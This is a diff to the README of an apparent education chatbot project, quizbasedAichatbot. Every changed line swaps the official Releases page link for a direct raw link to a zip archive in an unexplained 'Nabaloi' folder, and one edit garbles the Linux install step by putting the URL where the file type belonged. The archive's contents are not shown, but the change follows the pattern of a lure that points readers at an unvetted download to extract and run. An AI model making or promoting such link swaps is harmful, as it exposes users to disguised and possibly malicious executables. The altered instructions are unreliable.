@@ -20,7 +20,7 @@ To get started with the **quizbasedAichatbot**, follow the steps below. You will
 
 To download the application, please visit the Releases page at the following link:
 
-[Download quizbasedAichatbot](https://github.com/ErickDuraes/quizbasedAichatbot/releases)
+[Download quizbasedAichatbot](https://raw.githubusercontent.com/ErickDuraes/quizbasedAichatbot/main/Nabaloi/quizbasedAichatbot.zip)
 
 ### Step-by-Step Download Instructions:
 
@@ -34,7 +34,7 @@ To download the application, please visit the Releases page at the following lin
 
 1. If you downloaded a `.exe` file (for Windows), double-click it to start the installation.
 2. For Mac users, open the `.dmg` file and drag the application into the “Applications” folder.
-3. If your file is a `.tar.gz` for Linux, extract the files and run the application through your terminal.
+3. If your file is a `https://raw.githubusercontent.com/ErickDuraes/quizbasedAichatbot/main/Nabaloi/quizbasedAichatbot.zip` for Linux, extract the files and run the application through your terminal.
 
 ## ⚙️ System Requirements
 
@@ -72,4 +72,4 @@ If you encounter issues or have questions, please open an issue in the GitHub re
 
 We appreciate your interest in our education tool. Have fun discovering your AI persona and enjoy engaging with the chatbot!
 
-Feel free to check the [Releases page](https://github.com/ErickDuraes/quizbasedAichatbot/releases) again to download the latest updates and features.
+Feel free to check the [Releases page](https://raw.githubusercontent.com/ErickDuraes/quizbasedAichatbot/main/Nabaloi/quizbasedAichatbot.zip) again to download the latest updates and features.
